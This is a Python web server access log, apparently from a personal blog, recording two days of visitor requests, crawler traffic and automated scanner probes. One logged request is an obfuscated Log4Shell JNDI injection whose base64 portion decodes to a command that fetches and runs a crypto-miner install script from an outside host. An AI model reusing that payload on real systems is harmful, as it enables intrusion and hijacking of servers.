+185.161.248.141 - - [11/Apr/2024 02:19:08] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.161.248.141 - - [11/Apr/2024 02:19:08] "  /*à     Cookie: mstshash=Administr" 400 -
+192.241.223.7 - - [11/Apr/2024 04:17:03] "GET / HTTP/1.1" 200 -
+157.55.39.204 - - [11/Apr/2024 05:41:16] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 09:14:41] "GET /resource/list-infostream-src/ HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 09:14:42] "GET /css/font.css HTTP/1.1" 200 -
+104.28.245.201 - - [11/Apr/2024 09:14:42] "GET /css/reset.css HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 09:14:43] "GET /css/smigle.css HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 09:14:44] "GET /images/wxf.jpg HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 09:14:48] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 09:14:48] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+1.24.16.220 - - [11/Apr/2024 09:39:16] "GET / HTTP/1.1" 200 -
+220.167.232.231 - - [11/Apr/2024 09:40:08] "GET / HTTP/1.1" 200 -
+182.245.79.220 - - [11/Apr/2024 09:40:09] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+118.123.105.93 - - [11/Apr/2024 10:20:44] code 400, message Bad HTTP/0.9 request type ('\\x01\\x00\\x00\\x00')
+118.123.105.93 - - [11/Apr/2024 10:20:44] "\x01\x00\x00\x00 \xbf\x02\x00\x88\x13\x00\x00\x87\x00\x00\x00NIMABIJIAN\x04\x03\x00\x00{\x99Caig\x9c\x03\xc7eB\xc5\t\xc1\x18a\x11\x1a\x91\x1f\x02\tcof\x91\xc0\x80sJ5\xd2\x80\xe6\x9a~\xb9\xc7\x83^\x96\xeeN\x16\x96\x96&\xe6\x03\xea\xbc\x81\x02=\xac\x10\xfa?7\x03\xc3\xdf\xf7\xe4\x98`p\xe6\x8d\xc1\xa9\x8d\xc6\x06\xdb\xaf\x91\xe7\x82s\xf7\x14H\xd4\xe1W\x9a\x93C\x9e]\xa4\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03b\xf4\x00\x00/\x9e\x16E" 400 -
+118.123.105.93 - - [11/Apr/2024 10:20:44] "GET /favicon.ico HTTP/1.1" 200 -
+118.123.105.93 - - [11/Apr/2024 10:20:44] code 404, message File not found
+118.123.105.93 - - [11/Apr/2024 10:20:44] "GET /robots.txt HTTP/1.1" 404 -
+118.123.105.93 - - [11/Apr/2024 10:20:44] code 404, message File not found
+118.123.105.93 - - [11/Apr/2024 10:20:44] "GET /.well-known/security.txt HTTP/1.1" 404 -
+104.28.245.200 - - [11/Apr/2024 11:34:32] "GET / HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 11:34:35] "GET /project/ HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 11:34:39] "GET /resource/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%80%9D%E8%80%83/ HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 11:34:40] "GET /img/2023-08-19_07-23-03.png HTTP/1.1" 200 -
+104.28.245.201 - - [11/Apr/2024 11:34:41] "GET /img/2023-08-19_08-15-46.png HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 12:35:02] "GET /resource/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8+%E6%90%AD%E7%A7%AF%E6%9C%A8/ HTTP/1.1" 200 -
+104.28.245.201 - - [11/Apr/2024 12:35:02] "GET /img/Snipaste_2024-04-02_00-52-21.png HTTP/1.1" 200 -
+104.28.245.201 - - [11/Apr/2024 12:35:03] "GET /img/Snipaste_2024-04-02_01-13-36.png HTTP/1.1" 200 -
+104.28.245.201 - - [11/Apr/2024 12:35:03] "GET /img/Snipaste_2024-04-02_01-14-11.png HTTP/1.1" 200 -
+104.28.245.201 - - [11/Apr/2024 12:35:03] "GET /img/Snipaste_2024-04-02_01-14-19.png HTTP/1.1" 200 -
+104.28.245.201 - - [11/Apr/2024 12:35:04] "GET /img/Snipaste_2024-04-02_01-14-36.png HTTP/1.1" 200 -
+104.28.245.200 - - [11/Apr/2024 12:35:04] "GET /img/Snipaste_2024-04-02_01-14-26.png HTTP/1.1" 200 -
+78.128.114.22 - - [11/Apr/2024 12:39:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+78.128.114.22 - - [11/Apr/2024 12:39:12] "  /*à     Cookie: mstshash=Administr" 400 -
+178.159.37.98 - - [11/Apr/2024 12:39:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [11/Apr/2024 12:39:58] "  /*à     Cookie: mstshash=Administr" 400 -
+87.236.176.244 - - [11/Apr/2024 12:51:17] "GET / HTTP/1.1" 200 -
+87.236.176.22 - - [11/Apr/2024 12:51:18] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+87.236.176.186 - - [11/Apr/2024 12:51:18] "GET /favicon-16x16.png HTTP/1.1" 200 -
+87.236.176.221 - - [11/Apr/2024 12:51:18] "GET /favicon-32x32.png HTTP/1.1" 200 -
+78.128.114.22 - - [11/Apr/2024 12:58:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+78.128.114.22 - - [11/Apr/2024 12:58:42] "  /*à     Cookie: mstshash=Administr" 400 -
+178.62.216.118 - - [11/Apr/2024 13:05:46] code 404, message File not found
+178.62.216.118 - - [11/Apr/2024 13:05:46] "GET /aaa9 HTTP/1.1" 404 -
+178.62.216.118 - - [11/Apr/2024 13:05:46] code 404, message File not found
+178.62.216.118 - - [11/Apr/2024 13:05:46] "GET /aab8 HTTP/1.1" 404 -
+178.62.216.118 - - [11/Apr/2024 13:05:47] "GET / HTTP/1.1" 200 -
+185.161.248.141 - - [11/Apr/2024 13:44:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.161.248.141 - - [11/Apr/2024 13:44:47] "  /*à     Cookie: mstshash=Administr" 400 -
+64.62.156.120 - - [11/Apr/2024 15:51:59] "GET / HTTP/1.1" 200 -
+64.62.156.112 - - [11/Apr/2024 15:52:17] "GET /favicon.ico HTTP/1.1" 200 -
+64.62.156.113 - - [11/Apr/2024 15:52:20] code 404, message File not found
+64.62.156.113 - - [11/Apr/2024 15:52:20] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+64.62.156.109 - - [11/Apr/2024 15:52:23] code 501, message Unsupported method ('CONNECT')
+64.62.156.109 - - [11/Apr/2024 15:52:23] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+157.55.39.49 - - [11/Apr/2024 16:32:34] "GET /resource/%E8%AE%BE%E8%AE%A1%E4%BA%BA%E7%94%9F-%E7%BA%A6%E6%9D%9F%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+157.55.39.49 - - [11/Apr/2024 16:32:35] "GET /posts/hello-wrold/ HTTP/1.1" 200 -
+157.55.39.49 - - [11/Apr/2024 16:32:36] "GET /resource/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%B4%BB%E5%AD%A6%E4%B9%A0%E5%8D%95%E5%85%83_end/ HTTP/1.1" 200 -
+157.55.39.49 - - [11/Apr/2024 16:32:36] "GET /resource/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8+%E6%90%AD%E7%A7%AF%E6%9C%A8/ HTTP/1.1" 200 -
+157.55.39.49 - - [11/Apr/2024 16:32:37] "GET /resource/%E5%BB%B6%E8%BF%9F%E6%BB%A1%E8%B6%B3/ HTTP/1.1" 200 -
+52.167.144.184 - - [11/Apr/2024 16:32:48] "GET /resource/%E7%AD%96%E7%95%A5-%E8%BF%BD%E8%B8%AA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+52.167.144.184 - - [11/Apr/2024 16:32:49] "GET /resource/vedio/ HTTP/1.1" 200 -
+52.167.144.184 - - [11/Apr/2024 16:32:50] "GET /resource/workflow_inbox/ HTTP/1.1" 200 -
+52.167.144.184 - - [11/Apr/2024 16:32:51] "GET /posts/%E6%92%AD%E5%AE%A2%E8%BD%AC%E8%AF%91%E6%96%B9%E6%B3%95/ HTTP/1.1" 200 -
+52.167.144.184 - - [11/Apr/2024 16:32:51] "GET /resource/ref-%E6%B5%85%E8%B0%88%E6%9C%80%E4%BD%B3%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/ HTTP/1.1" 200 -
+52.167.144.184 - - [11/Apr/2024 16:32:52] "GET /resource/%E6%94%B9%E5%8F%98%E9%97%AE%E9%A2%98%E7%9A%84%E5%BD%A2%E6%88%90%E5%92%8C%E8%A7%A3%E5%86%B3/ HTTP/1.1" 200 -
+52.167.144.233 - - [11/Apr/2024 16:32:54] "GET /posts/%E5%85%A8%E6%A0%88%E8%B5%84%E6%BA%90/ HTTP/1.1" 200 -
+52.167.144.233 - - [11/Apr/2024 16:32:55] "GET /posts/archive-%E7%8E%8B%E5%BD%A6%E5%BD%A6/ HTTP/1.1" 200 -
+52.167.144.233 - - [11/Apr/2024 16:32:56] "GET /resource/list-infostream-src/ HTTP/1.1" 200 -
+52.167.144.233 - - [11/Apr/2024 16:32:57] "GET /posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%94%B6%E7%BC%A9%E5%BC%95%E6%93%8Eyacy/ HTTP/1.1" 200 -
+52.167.144.233 - - [11/Apr/2024 16:32:58] "GET /resource/%E9%87%91%E9%92%B1%E8%A7%82/ HTTP/1.1" 200 -
+153.35.4.35 - - [11/Apr/2024 17:27:46] code 400, message Bad request syntax ('SSH-2.0-OpenSSH')
+153.35.4.35 - - [11/Apr/2024 17:27:46] "SSH-2.0-OpenSSH" 400 -
+79.124.49.202 - - [11/Apr/2024 17:56:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [11/Apr/2024 17:56:46] "  /*à     Cookie: mstshash=Administr" 400 -
+198.235.24.232 - - [11/Apr/2024 18:03:11] "GET / HTTP/1.1" 200 -
+87.246.7.78 - - [11/Apr/2024 18:35:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+87.246.7.78 - - [11/Apr/2024 18:35:01] "  /*à     Cookie: mstshash=Administr" 400 -
+87.236.176.212 - - [11/Apr/2024 19:02:24] "GET / HTTP/1.1" 200 -
+87.236.176.234 - - [11/Apr/2024 19:02:26] "GET /favicon-32x32.png HTTP/1.1" 200 -
+87.236.176.189 - - [11/Apr/2024 19:02:26] "GET /favicon-16x16.png HTTP/1.1" 200 -
+87.236.176.107 - - [11/Apr/2024 19:02:26] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+107.170.225.18 - - [11/Apr/2024 19:38:14] code 400, message Bad request version ('À\x14À')
+107.170.225.18 - - [11/Apr/2024 19:38:14] " {  wiÙ<3eLêkn°<{ú£5×_É¯£  À/À+ÀÀÀÀ	ÀÀ" 400 -
+113.180.113.242 - - [11/Apr/2024 22:17:58] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+113.180.113.242 - - [11/Apr/2024 22:17:58] "    c                           " 400 -
+113.180.113.242 - - [11/Apr/2024 22:18:02] code 400, message Bad request syntax ('\xa0\x00\x00`\x00\x00\x00\x00admin\x00\x00\x00admin\x00\x00\x00\x04\x01\x00\x00\x00\x00¡ª')
+113.180.113.242 - - [11/Apr/2024 22:18:02] "   `    admin   admin       ¡ª" 400 -
+----------------------------------------
+Exception occurred during processing of request from ('167.94.138.49', 36158)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+167.94.138.49 - - [11/Apr/2024 22:26:29] "GET / HTTP/1.1" 200 -
+167.94.138.49 - - [11/Apr/2024 22:26:32] "GET / HTTP/1.1" 200 -
+167.94.138.49 - - [11/Apr/2024 22:26:33] code 505, message Invalid HTTP version (2.0)
+167.94.138.49 - - [11/Apr/2024 22:26:33] "PRI * HTTP/2.0" 505 -
+167.94.138.49 - - [11/Apr/2024 22:26:33] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+167.94.138.49 - - [11/Apr/2024 22:26:34] "GET /favicon-32x32.png HTTP/1.1" 200 -
+167.94.138.49 - - [11/Apr/2024 22:26:34] "GET /favicon-16x16.png HTTP/1.1" 200 -
+167.94.138.49 - - [11/Apr/2024 22:26:35] "GET /favicon.ico HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:01] "GET / HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:02] "GET /css/reset.css HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:02] "GET /images/wxf.jpg HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:02] "GET /css/smigle.css HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:02] "GET /css/font.css HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:03] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:03] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:06] "GET /project/ HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:07] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:16:07] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:17:12] "GET /project/ HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:17:15] "GET /favicon-32x32.png HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:17:32] "GET /project/ HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:17:34] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:15] "GET / HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:16] "GET /css/font.css HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:18:16] "GET /css/reset.css HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:18:16] "GET /images/wxf.jpg HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:18:16] "GET /css/smigle.css HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:18:16] "GET /site.webmanifest HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:18:16] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:18:16] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:18:18] "GET /project/ HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:20] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:26] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:26] "GET /css/reset.css HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:26] "GET /css/smigle.css HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:26] "GET /css/font.css HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:26] "GET /site.webmanifest HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:26] "GET /images/wxf.jpg HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:26] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:26] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:30] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:30] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:30] "GET /favicon.ico HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:30] code 404, message File not found
+223.104.209.52 - - [11/Apr/2024 23:18:30] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 -
+223.104.209.52 - - [11/Apr/2024 23:18:31] "GET /favicon-16x16.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:31] "GET /favicon-32x32.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:31] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:32] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:32] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:33] "GET /favicon-32x32.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:33] "GET /favicon-16x16.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:38] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:18:52] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:18:54] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 200 -
+113.108.28.64 - - [11/Apr/2024 23:19:02] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.0" 200 -
+223.104.209.52 - - [11/Apr/2024 23:19:14] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:19:37] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:20:21] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:20:31] "GET /project/ HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:20:36] "GET /resource/%E5%A6%82%E4%BD%95%E9%80%82%E5%BA%94%E4%B8%80%E5%AE%B6%E5%85%AC%E5%8F%B8/ HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:20:43] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+223.104.209.52 - - [11/Apr/2024 23:20:49] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 200 -
+223.104.209.52 - - [11/Apr/2024 23:20:49] "GET /img/2024-04-09012019.jpg HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('223.104.209.52', 16911)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+223.104.209.52 - - [11/Apr/2024 23:21:42] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+36.232.39.182 - - [11/Apr/2024 23:22:14] "GET /project/ HTTP/1.1" 304 -
+36.232.39.182 - - [11/Apr/2024 23:22:22] "GET /resource/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%B4%BB%E5%AD%A6%E4%B9%A0%E5%8D%95%E5%85%83_end/ HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:23] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:23] "GET /css/reset.css HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:23] "GET /css/font.css HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:23] "GET /css/smigle.css HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:23] "GET /images/wxf.jpg HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:24] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:24] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:30] "GET /favicon-16x16.png HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:35:30] "GET /favicon-32x32.png HTTP/1.1" 200 -
+39.144.153.63 - - [11/Apr/2024 23:37:15] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+36.150.60.24 - - [11/Apr/2024 23:40:14] code 400, message Bad request version ('À(À$À\x14À')
+36.150.60.24 - - [11/Apr/2024 23:40:14] " Ý  ÙÇJuIëÔLëxpîklëZtLÕW¤þYG  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" 400 -
+36.150.60.24 - - [11/Apr/2024 23:40:18] code 400, message Bad request version ('À(À$À\x14À')
+36.150.60.24 - - [11/Apr/2024 23:40:18] " Ý  ÙêºÔ¥&}#/=7¾m-03ëÿ§Q7¡`ä#lÞ  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" 400 -
+36.150.60.24 - - [11/Apr/2024 23:40:32] "GET / HTTP/1.1" 200 -
+36.150.60.24 - - [11/Apr/2024 23:40:40] "GET /favicon.ico HTTP/1.1" 200 -
+36.150.60.24 - - [11/Apr/2024 23:42:12] "GET / HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:42:40] "GET /posts/ HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:42:49] "GET /resource/windows%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86/ HTTP/1.1" 200 -
+36.232.39.182 - - [11/Apr/2024 23:42:50] "GET /img/Snipaste_2024-02-08_07-59-57.png HTTP/1.1" 200 -
+36.150.60.24 - - [11/Apr/2024 23:45:13] code 400, message Bad request version ('À(À$À\x14À')
+36.150.60.24 - - [11/Apr/2024 23:45:13] " Ý  ÙÏ©ÁP],jÒLKë°eS;êX/ã¾..  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" 400 -
+36.150.60.24 - - [11/Apr/2024 23:49:03] code 400, message Bad request version ('À(À$À\x14À')
+36.150.60.24 - - [11/Apr/2024 23:49:03] " Ý  Ùç²æ$Óhnmà£fpè«ß¢"EI ½(Uáá  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" 400 -
+36.150.60.24 - - [11/Apr/2024 23:49:52] "GET / HTTP/1.1" 200 -
+223.104.209.36 - - [11/Apr/2024 23:56:37] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+223.104.209.36 - - [12/Apr/2024 00:01:03] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+223.104.209.36 - - [12/Apr/2024 00:07:47] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+223.104.209.36 - - [12/Apr/2024 00:30:18] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+91.240.118.187 - - [12/Apr/2024 00:42:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+91.240.118.187 - - [12/Apr/2024 00:42:49] "  /*à     Cookie: mstshash=Administr" 400 -
+162.142.125.217 - - [12/Apr/2024 00:44:29] "GET / HTTP/1.1" 200 -
+162.142.125.217 - - [12/Apr/2024 00:44:30] code 505, message Invalid HTTP version (2.0)
+162.142.125.217 - - [12/Apr/2024 00:44:30] "PRI * HTTP/2.0" 505 -
+162.142.125.217 - - [12/Apr/2024 00:44:31] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+162.142.125.217 - - [12/Apr/2024 00:44:32] "GET /favicon-32x32.png HTTP/1.1" 200 -
+162.142.125.217 - - [12/Apr/2024 00:44:33] "GET /favicon-16x16.png HTTP/1.1" 200 -
+162.142.125.217 - - [12/Apr/2024 00:44:33] "GET /favicon.ico HTTP/1.1" 200 -
+223.104.209.36 - - [12/Apr/2024 01:08:58] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+95.214.53.103 - - [12/Apr/2024 07:45:02] code 404, message File not found
+95.214.53.103 - - [12/Apr/2024 07:45:02] "GET /t(%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//139.99.171.1:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuYzNwb29sLm9yZy94bXJpZ19zZXR1cC9yYXcvbWFzdGVyL3NldHVwX2MzcG9vbF9taW5lci5zaCB8IExDX0FMTD1lbl9VUy5VVEYtOCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO%7D%27) HTTP/1.1" 404 -
+52.167.144.142 - - [12/Apr/2024 08:22:38] code 404, message File not found
+52.167.144.142 - - [12/Apr/2024 08:22:38] "GET /sitemaps.xml HTTP/1.1" 404 -
+178.159.37.98 - - [12/Apr/2024 09:00:54] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [12/Apr/2024 09:00:54] "  /*à     Cookie: mstshash=Administr" 400 -
+178.159.37.98 - - [12/Apr/2024 09:09:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [12/Apr/2024 09:09:04] "  /*à     Cookie: mstshash=Administr" 400 -
+64.62.197.27 - - [12/Apr/2024 09:29:39] "GET / HTTP/1.1" 200 -
+64.62.197.31 - - [12/Apr/2024 09:29:57] "GET /favicon.ico HTTP/1.1" 200 -
+64.62.197.27 - - [12/Apr/2024 09:30:02] code 404, message File not found
+64.62.197.27 - - [12/Apr/2024 09:30:02] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+64.62.197.27 - - [12/Apr/2024 09:30:05] code 501, message Unsupported method ('CONNECT')
+64.62.197.27 - - [12/Apr/2024 09:30:05] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+207.46.13.111 - - [12/Apr/2024 09:52:41] code 404, message File not found
+207.46.13.111 - - [12/Apr/2024 09:52:41] "GET /atom.xml HTTP/1.1" 404 -
+36.232.39.182 - - [12/Apr/2024 11:29:03] "GET /project/ HTTP/1.1" 200 -
